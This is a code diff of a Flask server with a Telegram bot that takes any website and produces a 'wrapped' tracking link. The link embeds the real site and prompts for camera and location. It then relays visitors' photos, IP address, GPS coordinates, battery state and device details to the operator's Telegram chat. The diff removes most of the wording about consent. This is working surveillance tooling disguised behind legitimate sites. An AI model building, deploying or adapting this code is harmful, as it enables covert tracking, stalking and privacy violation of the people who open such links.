@@ -1,5 +1,4 @@
 # server.py - Flask app with Telegram webhook (single-file deploy)
-# Final cleaned version. Keep this as server.py (not server.js).
 import os
 import uuid
 import base64
@@ -8,6 +7,8 @@ import requests
 from datetime import datetime
 from dotenv import load_dotenv
 from flask import Flask, request, send_from_directory, render_template, jsonify, url_for
+
+from urllib.parse import urlparse
 
 # load .env in development
 load_dotenv()
@@ -47,13 +48,12 @@ SESSIONS = load_sessions()
 # Key: str(chat_id), Value: {"awaiting_url": bool}
 CHAT_STATE = {}
 
-# ---------- Telegram helpers ----------
+# ---------- Small helpers ----------
 def telegram_api(method: str, data=None, files=None, timeout=30):
     if not TELEGRAM_BOT_TOKEN:
         return None, "no_token"
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
     try:
-        # when files is None we send JSON payload; when files present we send multipart/form-data
         if files is None:
             r = requests.post(url, json=data or {}, timeout=timeout)
         else:
@@ -66,7 +66,7 @@ def tg_send_text(chat_id: str, text: str):
     if not TELEGRAM_BOT_TOKEN or not chat_id:
         return False
     payload = {"chat_id": str(chat_id), "text": text}
-    r, err = telegram_api("sendMessage", data=payload)
+    r, _ = telegram_api("sendMessage", data=payload)
     return bool(r and r.ok)
 
 def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
@@ -78,13 +78,10 @@ def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
             data = {"chat_id": str(chat_id)}
             if caption:
                 data["caption"] = caption
-            r, err = telegram_api("sendPhoto", data=data, files=files)
+            r, _ = telegram_api("sendPhoto", data=data, files=files)
             return bool(r and r.ok)
     except Exception:
         return False
-
-# ---------- URL validation / normalization ----------
-from urllib.parse import urlparse
 
 def is_valid_http_url(u: str):
     try:
@@ -94,8 +91,6 @@ def is_valid_http_url(u: str):
         return False
 
 def normalize_url_for_wrap(text: str):
-    """Accepts 'example.com' or 'https://example.com' etc.
-       Returns a proper http/https URL or None."""
     if not text:
         return None
     u = text.strip()
@@ -103,19 +98,49 @@ def normalize_url_for_wrap(text: str):
         return None
     p = urlparse(u)
     if not p.scheme:
-        # no scheme: assume https
         u = "https://" + u
         p = urlparse(u)
     if p.scheme not in ("http", "https") or not p.netloc:
         return None
     return u
 
+def format_battery(bat):
+    if not bat:
+        return "unknown"
+    try:
+        level = bat.get("level")
+        charging = bat.get("charging")
+        if isinstance(level, (int, float)):
+            if level <= 1:
+                pct = round(level * 100)
+            else:
+                pct = round(level)
+            return f"{pct}%{' (charging)' if charging else ''}"
+        return str(bat)
+    except Exception:
+        return str(bat)
+
+def format_coords(coords):
+    if not coords:
+        return "unknown"
+    try:
+        lat = coords.get("lat")
+        lon = coords.get("lon")
+        acc = coords.get("acc") or coords.get("accuracy")
+        if lat is None or lon is None:
+            return str(coords)
+        if acc is not None:
+            return f"{lat},{lon} (±{acc} m)"
+        return f"{lat},{lon}"
+    except Exception:
+        return str(coords)
+
 # ---------- Endpoints ----------
 @app.route("/")
 def index():
     return ("Flask server for consented device session. Use the Telegram bot to create sessions.", 200)
 
-# Standard session creation (bare consent page, no wrapped site)
+# Plain session creation (no embedded site) - kept for compatibility
 @app.route("/create", methods=["POST"])
 def create_session():
     data = request.get_json(silent=True) or {}
@@ -133,10 +158,9 @@ def create_session():
     if chat_id:
         tg_send_text(
             chat_id,
-            "Plain session created.\n"
+            f"Plain session created\n"
             f"Token: {token}\n"
-            f"Open: {link}\n"
-            "Keep permissions allowed while page is open."
+            f"Link: {link}"
         )
     return jsonify({"token": token, "link": link})
 
@@ -149,13 +173,12 @@ def session_page(token):
     except Exception:
         return f"Session page for {token}", 200
 
-# Wrapper creation (embed a target URL)
+# Wrapped session (site + tracker)
 @app.route("/wrap_create", methods=["POST"])
 def wrap_create():
     data = request.get_json(silent=True) or {}
     target_url = data.get("target_url", "").strip()
 
-    # Here we assume target_url is already normalized/valid
     if not is_valid_http_url(target_url):
         return jsonify({"error": "invalid_url"}), 400
 
@@ -173,17 +196,12 @@ def wrap_create():
     save_sessions(SESSIONS)
     link = url_for("wrapper_page", token=token, _external=True)
     if chat_id:
+        # Keep this message very short and clean
         tg_send_text(
             chat_id,
-            "Wrapped session created.\n"
-            f"Original site: {target_url}\n"
-            f"Wrapped link: {link}\n\n"
-            "Send this wrapped link to the user.\n"
-            "When they open it:\n"
-            "• They see the original site\n"
-            "• They get a consent prompt\n"
-            "• On consent, photos, IP, battery and basic device info\n"
-            "  are sent back here while the page is open."
+            "Wrapped session created\n"
+            f"Site: {target_url}\n"
+            f"Link: {link}"
         )
     return jsonify({"token": token, "link": link})
 
@@ -219,29 +237,29 @@ def upload_info(token):
 
     chat_id = SESSIONS[token].get("chat_id")
     if chat_id:
-        bat = entry.get("battery")
-        coords = entry.get("coords")
+        bat_txt = format_battery(entry.get("battery"))
+        coords_txt = format_coords(entry.get("coords"))
         ua_short = (ua[:180] + "...") if ua and len(ua) > 180 else ua
         lines = [
-            f"Session {token} — info at {entry['timestamp']}",
+            f"Session {token} (info)",
+            f"Time: {entry['timestamp']}",
             f"IP: {ip}",
-            f"Battery: {bat}",
-            f"Coords: {coords}",
+            f"Battery: {bat_txt}",
+            f"Coords: {coords_txt}",
         ]
         if ua_short:
-            lines.append(f"User-Agent: {ua_short}")
+            lines.append(f"Device: {ua_short}")
         tg_send_text(chat_id, "\n".join(lines))
     return jsonify({"status": "ok", "stored": entry})
 
-# Single upload_image handler (final version)
 @app.route("/upload_image/<token>", methods=["POST"])
 def upload_image(token):
     """
     Accepts JSON body:
       {
         "image_b64": "data:image/jpeg;base64,...",
-        "coords": {"lat":..., "lon":..., "accuracy":...}  (optional),
-        "battery": {"level":..., "charging":...}          (optional)
+        "coords": {"lat":..., "lon":..., "accuracy" or "acc":...}  (optional),
+        "battery": {"level":..., "charging":...}                    (optional)
       }
     """
     if token not in SESSIONS:
@@ -265,7 +283,6 @@ def upload_image(token):
     except Exception:
         return ("Bad base64", 400)
 
-    # limit image size (reject if > 10 MB)
     if len(imgbytes) > 10_000_000:
         return ("Image too large", 413)
 
@@ -279,7 +296,6 @@ def upload_image(token):
         print("Failed to write image:", e)
         return ("Server error saving image", 500)
 
-    # persist filename and metadata
     sess = SESSIONS[token]
     sess.setdefault("files", []).append(fname)
     meta = {
@@ -294,22 +310,18 @@ def upload_image(token):
     sess.setdefault("images_meta", []).append(meta)
     save_sessions(SESSIONS)
 
-    # Notify Telegram: prefer sending the photo (so it appears in chat)
     chat_id = sess.get("chat_id")
     if chat_id:
-        caption_parts = [f"Session {token} — photo {timestamp}"]
-        caption_parts.append(f"IP: {ip}")
-        if coords:
-            caption_parts.append(
-                f"Coords: {coords.get('lat')},{coords.get('lon')} (acc {coords.get('accuracy')})"
-            )
-        if battery:
-            lev = battery.get("level")
-            ch = battery.get("charging")
-            caption_parts.append(
-                f"Battery: {lev}%{' charging' if ch else ''}"
-            )
-        caption = "\n".join(caption_parts)
+        bat_txt = format_battery(battery)
+        coords_txt = format_coords(coords)
+        caption_lines = [
+            f"Session {token} (photo)",
+            f"Time: {timestamp}",
+            f"IP: {ip}",
+            f"Battery: {bat_txt}",
+            f"Coords: {coords_txt}",
+        ]
+        caption = "\n".join(caption_lines)
         sent = tg_send_photo(chat_id, path, caption=caption)
         if not sent:
             try:
@@ -328,10 +340,9 @@ def session_data(token):
 
 @app.route("/uploads/<filename>")
 def serve_upload(filename):
-    # Consider protecting this endpoint in production
     return send_from_directory(UPLOAD_DIR, filename)
 
-# ---------- Telegram webhook endpoint ----------
+# ---------- Telegram webhook ----------
 @app.route(f"/telegram/{TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
 def telegram_webhook():
     if not TELEGRAM_BOT_TOKEN:
@@ -352,45 +363,31 @@ def telegram_webhook():
         if not text or chat_key is None:
             return "ok", 200
 
-        # Normalize state object for this chat
         state = CHAT_STATE.get(chat_key, {"awaiting_url": False})
-
-        # ---------- Commands ----------
 
         # /cancel
         if text.lower().startswith("/cancel"):
             state["awaiting_url"] = False
             CHAT_STATE[chat_key] = state
-            tg_send_text(
-                chat_id,
-                "Cancelled.\n"
-                "Send /start to begin a new wrapped session."
-            )
+            tg_send_text(chat_id, "Cancelled.\nUse /start to begin again.")
             return "ok", 200
 
-        # /start
+        # /start -> ask for site
         if text.lower().startswith("/start"):
             state["awaiting_url"] = True
             CHAT_STATE[chat_key] = state
             tg_send_text(
                 chat_id,
-                "Welcome.\n\n"
-                "Send me the website you want to wrap.\n"
+                "Send the website you want to embed.\n"
                 "Examples:\n"
-                "• example.com\n"
-                "• https://yourdomain.com\n\n"
-                "I will reply with a special link that:\n"
-                "1) Opens that same site\n"
-                "2) Shows a consent screen\n"
-                "3) On consent, captures photos, IP, battery, and basic device info\n"
-                "   while the page is open.\n\n"
-                "Commands:\n"
-                "• /cancel – cancel current flow\n"
-                "• /status <token> – check a session by token"
+                "  example.com\n"
+                "  https://unstop.com\n\n"
+                "I will reply with a single link that opens that site\n"
+                "and asks for camera/location in a popup."
             )
             return "ok", 200
 
-        # /create <label> (optional legacy plain session)
+        # /create <label> (optional plain session)
         if text.lower().startswith("/create"):
             parts = text.split(maxsplit=1)
             label = parts[1] if len(parts) > 1 else ""
@@ -404,16 +401,15 @@ def telegram_webhook():
                     data = r.json()
                     tg_send_text(
                         chat_id,
-                        "Plain session created (no embedded website).\n\n"
+                        "Plain session created\n"
                         f"Token: {data['token']}\n"
-                        f"Link: {data['link']}\n\n"
-                        "For site-based tracking, use /start and send a website."
+                        f"Link: {data['link']}"
                     )
                 else:
-                    tg_send_text(chat_id, f"Failed to create session: server returned {r.status_code}")
+                    tg_send_text(chat_id, f"Failed to create session: {r.status_code}")
             except Exception as e:
                 print("create command error:", e)
-                tg_send_text(chat_id, "Failed to create session (server error).")
+                tg_send_text(chat_id, "Server error while creating session.")
             return "ok", 200
 
         # /status <token>
@@ -426,7 +422,7 @@ def telegram_webhook():
             try:
                 r = requests.get(url_for("session_data", token=token, _external=True), timeout=5)
                 if r.status_code != 200:
-                    tg_send_text(chat_id, f"Server returned status {r.status_code}: {r.text}")
+                    tg_send_text(chat_id, f"Server returned {r.status_code}: {r.text}")
                     return "ok", 200
                 data = r.json()
                 visits = data.get("visits", [])
@@ -436,40 +432,39 @@ def telegram_webhook():
                     f"Created: {data.get('created_at')}\n"
                     f"Total events: {len(visits)}"
                 )
-                for chunk in (summary[i:i+4000] for i in range(0, len(summary), 4000)):
-                    tg_send_text(chat_id, chunk)
-                # last few visits
+                tg_send_text(chat_id, summary)
                 for v in visits[-5:]:
-                    txt = (
-                        f"{v.get('timestamp')}\n"
-                        f"IP: {v.get('ip')}\n"
-                        f"Battery: {v.get('battery')}\n"
-                        f"Coords: {v.get('coords')}\n"
-                        f"User-Agent: {v.get('user_agent')}"
-                    )
-                    tg_send_text(chat_id, txt)
+                    bat_txt = format_battery(v.get("battery"))
+                    coords_txt = format_coords(v.get("coords"))
+                    ua = v.get("user_agent") or ""
+                    ua_short = (ua[:180] + "...") if len(ua) > 180 else ua
+                    lines = [
+                        f"Time: {v.get('timestamp')}",
+                        f"IP: {v.get('ip')}",
+                        f"Battery: {bat_txt}",
+                        f"Coords: {coords_txt}",
+                    ]
+                    if ua_short:
+                        lines.append(f"Device: {ua_short}")
+                    tg_send_text(chat_id, "\n".join(lines))
             except Exception as e:
                 print("status command error:", e)
                 tg_send_text(chat_id, f"Failed to fetch status: {e}")
             return "ok", 200
 
-        # ---------- Non-command text: treat as website if awaiting_url ----------
+        # Awaiting a site URL after /start
         if state.get("awaiting_url"):
-            # User is supposed to send a website now
             candidate = text.strip()
             url = normalize_url_for_wrap(candidate)
             if not url:
                 tg_send_text(
                     chat_id,
-                    "This does not look like a valid website.\n\n"
-                    "Send something like:\n"
-                    "• example.com\n"
-                    "• https://example.com\n\n"
-                    "Or send /cancel to stop."
+                    "That doesn't look like a valid site.\n"
+                    "Send something like: example.com or https://example.com\n"
+                    "Or /cancel to stop."
                 )
                 return "ok", 200
 
-            # Valid URL -> create wrapped session
             try:
                 r = requests.post(
                     url_for("wrap_create", _external=True),
@@ -482,31 +477,25 @@ def telegram_webhook():
                     CHAT_STATE[chat_key] = state
                     tg_send_text(
                         chat_id,
-                        "Wrapped session created.\n\n"
-                        f"Original site:\n{url}\n\n"
-                        f"Wrapped link:\n{data['link']}\n\n"
-                        "Share this wrapped link with the user.\n"
-                        "When they open it:\n"
-                        "• Your original site is embedded\n"
-                        "• They get a consent prompt\n"
-                        "• On consent, photos, IP, battery, and basic device info\n"
-                        "  are reported back to this chat."
+                        "Wrapped link ready\n"
+                        f"Site: {url}\n"
+                        f"Link: {data['link']}"
                     )
                 else:
-                    tg_send_text(chat_id, f"Failed to create wrapped session: server returned {r.status_code}")
+                    tg_send_text(chat_id, f"Failed to create wrapped session: {r.status_code}")
             except Exception as e:
-                print("wrap (awaiting url) error:", e)
-                tg_send_text(chat_id, "Failed to create wrapped session (server error).")
+                print("wrap_create error:", e)
+                tg_send_text(chat_id, "Server error while creating wrapped session.")
             return "ok", 200
 
-        # ---------- Fallback ----------
+        # Fallback
         tg_send_text(
             chat_id,
-            "I did not understand that.\n\n"
-            "Use:\n"
-            "• /start  – create an embedded tracking link for a website\n"
-            "• /status <token> – check an existing session\n"
-            "• /create <label> – plain session without embedded site (optional)"
+            "Commands:\n"
+            "/start  – create embedded tracking link for a site\n"
+            "/status <token> – show session info\n"
+            "/create <label> – plain session (no site)\n"
+            "/cancel – cancel current flow"
         )
         return "ok", 200
 
@@ -517,7 +506,6 @@ def telegram_webhook():
 
 # ---------- Run ----------
 if __name__ == "__main__":
-    debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
-    port = int(os.environ.get("PORT", 5000))
-    # Development server. Use gunicorn in production.
-    app.run(host="0.0.0.0", port=port, debug=debug_mode)
+  debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
+  port = int(os.environ.get("PORT", 5000))
+  app.run(host="0.0.0.0", port=port, debug=debug_mode)
